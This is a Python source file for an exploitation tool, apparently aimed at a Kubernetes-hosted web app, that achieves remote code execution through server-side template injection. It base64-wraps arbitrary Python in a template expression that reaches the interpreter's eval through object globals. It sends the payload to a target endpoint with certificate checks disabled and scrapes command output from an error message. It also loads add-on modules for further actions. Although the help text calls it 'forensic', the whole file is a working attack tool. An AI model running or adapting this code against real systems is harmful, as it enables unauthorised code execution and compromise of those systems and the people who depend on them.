import requests
import base64
import argparse
import sys
import urllib3
import html

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class KubeExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        
    def _wrap_payload(self, py_code):
        """Wraps Python code into a Base64-encoded SSTI execution string."""
        # NEW: We strip newlines to ensure the payload is a valid single expression for eval()
        clean_code = py_code.replace('\n', ' ').strip()
        inner_cmd = f"eval(compile('''{clean_code}''', '<string>', 'eval'))"
        b64_cmd = base64.b64encode(inner_cmd.encode()).decode()
        
        return (
            f"{{{{self.__init__.__globals__.__builtins__.eval("
            f"self.__init__.__globals__.__builtins__.__import__('base64')"
            f".b64decode('{b64_cmd}'))}}}}"
        )

    def execute(self, py_code):
        payload = self._wrap_payload(py_code)
        try:
            response = requests.post(
                f"{self.target_url}/exploit-endpoint", 
                data={'q': payload}, 
                verify=False,
                timeout=45
            )
            
            start_marker = "The identifier '"
            end_marker = "' was not found"
            
            if start_marker in response.text:
                raw_output = response.text.split(start_marker)[1].split(end_marker)[0]
                return html.unescape(raw_output)
            
            return f"DEBUG_ERROR: Markers not found. Raw snippet: {response.text[:200]}"
            
        except Exception as e:
            return f"CONNECTION_FAILURE: {e}"

def main():
    parser = argparse.ArgumentParser(description="K8S Forensic SSTI Toolkit")
    parser.add_argument("--url", required=True, help="Target Route URL")
    parser.add_argument("--exec", help="Execute raw Python command")
    parser.add_argument("--addon", help="Execute modular addon")
    parser.add_argument('--quiet', '-q', action='store_true', help='Suppress banners')
    
    args, unknown = parser.parse_known_args()
    exploit = KubeExploit(args.url)

    if args.exec:
        print(f"[*] Dispatching Command: {args.exec}")
        print(f"[*] Result:\n{exploit.execute(args.exec)}")
    
    elif args.addon:
        try:
            addon = __import__(f"addons.{args.addon}", fromlist=['run'])
            # CHANGE: Pass the entire 'unknown' list instead of just index [0]
            addon.run(exploit, unknown) 
        except Exception as e:
            print(f"[-] Addon Execution Error: {e}")
    
if __name__ == "__main__":
    main()